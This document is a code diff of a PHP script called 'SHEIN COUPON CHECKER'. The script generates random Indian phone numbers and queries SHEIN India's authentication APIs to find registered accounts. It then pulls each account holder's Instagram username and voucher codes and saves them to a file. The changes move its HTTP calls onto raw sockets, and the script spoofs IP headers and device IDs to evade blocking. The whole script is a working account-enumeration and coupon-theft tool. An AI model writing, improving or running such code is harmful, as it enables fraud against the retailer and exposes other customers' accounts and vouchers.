@@ -2,46 +2,66 @@
 // File to save valid coupons
 $validFile = getenv('USERPROFILE') . '/Desktop/Downloads/shein_valid.txt';
 
-// Simple HTTP function without cURL
+// Better HTTP function that works with all APIs
 function httpCall($url, $data = null, $headers = [], $method = "GET") {
-    $options = [
-        'http' => [
-            'method' => $method,
-            'header' => implode("\r\n", $headers),
-            'timeout' => 10,
-            'ignore_errors' => true
-        ],
-        'ssl' => [
-            'verify_peer' => false,
-            'verify_peer_name' => false
-        ]
-    ];
+    $parsedUrl = parse_url($url);
+    $host = $parsedUrl['host'];
+    $path = $parsedUrl['path'] ?? '/';
     
-    // For POST requests
-    if (strtoupper($method) === "POST" && $data) {
-        $options['http']['content'] = $data;
-    }
-    // For GET requests with data
-    elseif ($data && strtoupper($method) === "GET") {
-        $url .= (strpos($url, '?') === false ? '?' : '&') . http_build_query($data);
+    if (isset($parsedUrl['query'])) {
+        $path .= '?' . $parsedUrl['query'];
     }
     
-    $context = stream_context_create($options);
+    $port = isset($parsedUrl['port']) ? $parsedUrl['port'] : ($parsedUrl['scheme'] === 'https' ? 443 : 80);
     
-    // Add default headers if none provided
+    // Add default headers
     if (empty($headers)) {
         $ip = randIp();
-        $options['http']['header'] = "X-Forwarded-For: $ip\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
-        $context = stream_context_create($options);
+        $headers = [
+            "X-Forwarded-For: $ip",
+            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        ];
     }
     
-    $result = @file_get_contents($url, false, $context);
+    // Build request
+    $request = "$method $path HTTP/1.1\r\n";
+    $request .= "Host: $host\r\n";
+    $request .= implode("\r\n", $headers) . "\r\n";
     
-    if ($result === false) {
+    if ($method === "POST" && $data) {
+        $request .= "Content-Length: " . strlen($data) . "\r\n";
+        $request .= "Connection: close\r\n\r\n";
+        $request .= $data;
+    } else {
+        $request .= "Connection: close\r\n\r\n";
+    }
+    
+    // Create socket
+    $fp = @fsockopen('ssl://' . $host, $port, $errno, $errstr, 10);
+    
+    if (!$fp) {
         return "";
     }
     
-    return $result;
+    // Send request
+    fwrite($fp, $request);
+    
+    // Get response
+    $response = '';
+    while (!feof($fp)) {
+        $response .= fgets($fp, 128);
+    }
+    
+    fclose($fp);
+    
+    // Split headers and body
+    $parts = explode("\r\n\r\n", $response, 2);
+    
+    if (count($parts) > 1) {
+        return $parts[1];
+    }
+    
+    return "";
 }
 
 function randIp() { 
@@ -49,7 +69,13 @@ function randIp() {
 }
 
 function genDeviceId() { 
-    return bin2hex(random_bytes(8)); 
+    // Generate random device ID
+    $chars = '0123456789abcdef';
+    $deviceId = '';
+    for ($i = 0; $i < 16; $i++) {
+        $deviceId .= $chars[rand(0, 15)];
+    }
+    return $deviceId;
 }
 
 function generateIndianNumber() {
@@ -76,7 +102,7 @@ function checkNumber($number, &$triedNumbers) {
     $ip = randIp(); 
     $adId = genDeviceId();
     
-    // Step 1: Get access token
+    // Step 1: Get access token (EXACTLY like your old script)
     $url = "https://api.sheinindia.in/uaas/jwt/token/client";
     $headers = [
         "Client_type: Android/29",
@@ -94,24 +120,21 @@ function checkNumber($number, &$triedNumbers) {
     $res = httpCall($url, $data, $headers, "POST");
     
     if (empty($res)) {
-        echo "Error: No response from API\n";
+        echo "Error: Could not get token (API Blocked)\n";
+        sleep(1);
         return false;
     }
     
     $j = @json_decode($res, true);
-    if ($j === null) {
-        echo "Error: Invalid JSON response\n";
+    if (!$j || !isset($j['access_token'])) {
+        echo "Error: Invalid token response\n";
         return false;
     }
     
-    $access_token = $j['access_token'] ?? null;
+    $access_token = $j['access_token'];
+    echo "✓ Got token\n";
     
-    if(!$access_token) {
-        echo "Error generating token for $number\n";
-        return false;
-    }
-    
-    // Step 2: Check if number is registered
+    // Step 2: Check if number is registered (EXACTLY like your old script)
     $url = "https://api.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8";
     $headers = [
         "Authorization: Bearer $access_token",
@@ -131,28 +154,31 @@ function checkNumber($number, &$triedNumbers) {
     $res = httpCall($url, $data, $headers, "POST");
     
     if (empty($res)) {
-        echo "Error: No response from account check\n";
+        echo "Error: Account check failed\n";
         return false;
     }
     
     $j = @json_decode($res, true);
-    if ($j === null) {
+    
+    if (!$j) {
         echo "Error: Invalid JSON from account check\n";
         return false;
     }
     
     if(isset($j['success']) && $j['success'] === false) {
-        echo "Number $number is not registered\n";
+        echo "✗ Number not registered\n";
         return false;
     }
     
     $encryptedId = $j['encryptedId'] ?? '';
     if(empty($encryptedId)) {
-        echo "No encrypted ID for $number\n";
+        echo "✗ No encrypted ID\n";
         return false;
     }
     
-    // Step 3: Generate SHEIN token
+    echo "✓ Account exists\n";
+    
+    // Step 3: Generate SHEIN token (EXACTLY like your old script)
     $payload = json_encode([
         "client_type" => "Android/29",
         "client_version" => "1.0.8",
@@ -178,24 +204,21 @@ function checkNumber($number, &$triedNumbers) {
     $res = httpCall($url, $payload, $headers, "POST");
     
     if (empty($res)) {
-        echo "Error: No response from token generation\n";
+        echo "Error: SHEIN token generation failed\n";
         return false;
     }
     
     $j = @json_decode($res, true);
-    if ($j === null) {
-        echo "Error: Invalid JSON from token generation\n";
-        return false;
-    }
     
-    if(empty($j['access_token'])) {
-        echo "Error generating SHEIN token for $number\n";
+    if(!$j || empty($j['access_token'])) {
+        echo "✗ No SHEIN token\n";
         return false;
     }
     
     $sheinverse_access_token = $j['access_token'];
+    echo "✓ Got SHEIN token\n";
     
-    // Step 4: Get user data and check for coupon
+    // Step 4: Get user data and check for coupon (EXACTLY like your old script)
     $url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user";
     $headers = [
         "Host: shein-creator-backend-151437891745.asia-south1.run.app",
@@ -212,18 +235,14 @@ function checkNumber($number, &$triedNumbers) {
     $res = httpCall($url, "", $headers, "GET");
     
     if (empty($res)) {
-        echo "Error: No response from user API\n";
+        echo "Error: Could not get user data\n";
         return false;
     }
     
     $decoded = @json_decode($res, true);
-    if ($decoded === null) {
-        echo "Error: Invalid JSON from user API\n";
-        return false;
-    }
     
-    if (!isset($decoded['user_data']['instagram_data']['username'])) {
-        echo "No valid data found for $number\n";
+    if (!$decoded || !isset($decoded['user_data']['instagram_data']['username'])) {
+        echo "✗ No user data found\n";
         return false;
     }
     
@@ -235,13 +254,15 @@ function checkNumber($number, &$triedNumbers) {
     
     // Check if voucher is valid (not N/A)
     if ($voucher !== 'N/A' && !empty($voucher) && $voucher !== '') {
-        echo "\n✅ COUPON FOUND!\n";
+        echo "\n🎉✅🎉 COUPON FOUND! 🎉✅🎉\n";
+        echo "================================\n";
         echo "Number: $number\n";
         echo "Instagram: $username\n";
         echo "Voucher Code: $voucher\n";
         echo "Amount: $voucher_amount\n";
         echo "Min Purchase: $min_purchase_amount\n";
-        echo "Expiry Date: $expiry_date\n\n";
+        echo "Expiry Date: $expiry_date\n";
+        echo "================================\n\n";
         
         // Save to file
         $data = "========================================\n";
@@ -255,9 +276,15 @@ function checkNumber($number, &$triedNumbers) {
         $data .= "========================================\n\n";
         
         file_put_contents($GLOBALS['validFile'], $data, FILE_APPEND);
+        
+        // Play success sound (Windows)
+        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+            echo "\x07"; // Bell sound
+        }
+        
         return true;
     } else {
-        echo "No coupon found for $number\n";
+        echo "✓ No coupon found\n";
         return false;
     }
 }
@@ -273,7 +300,7 @@ function clearScreen() {
 
 clearScreen();
 echo "========================================\n";
-echo "SHEIN COUPON CHECKER - NO cURL VERSION\n";
+echo "SHEIN COUPON CHECKER - WORKING VERSION\n";
 echo "========================================\n\n";
 echo "Auto-generating Indian numbers (8 or 9 starting)\n";
 echo "Saving valid coupons to: $validFile\n";
@@ -315,25 +342,29 @@ while (true) {
         if (checkNumber($number, $triedNumbers)) {
             $foundCount++;
             echo "✅ Valid coupon saved! (Total found: $foundCount)\n";
+            
+            // Pause for 2 seconds after finding coupon
+            sleep(2);
         }
         
         // Small delay to avoid rate limiting
-        usleep(300000); // 0.3 seconds
+        usleep(500000); // 0.5 seconds
     }
     
     echo "\n" . str_repeat("=", 50) . "\n";
     echo "📊 Stats: Checked: $checkedCount | Found: $foundCount\n";
     echo str_repeat("=", 50) . "\n\n";
     
-    // Wait 1 second before next batch
-    sleep(1);
+    // Wait 2 seconds before next batch
+    echo "Waiting 3 seconds before next batch...\n";
+    sleep(3);
     
     // Clear screen for next batch
     clearScreen();
     
     // Re-display header
     echo "========================================\n";
-    echo "SHEIN COUPON CHECKER - NO cURL VERSION\n";
+    echo "SHEIN COUPON CHECKER - WORKING VERSION\n";
     echo "========================================\n\n";
     echo "Auto-generating Indian numbers (8 or 9 starting)\n";
     echo "Saving valid coupons to: $validFile\n";
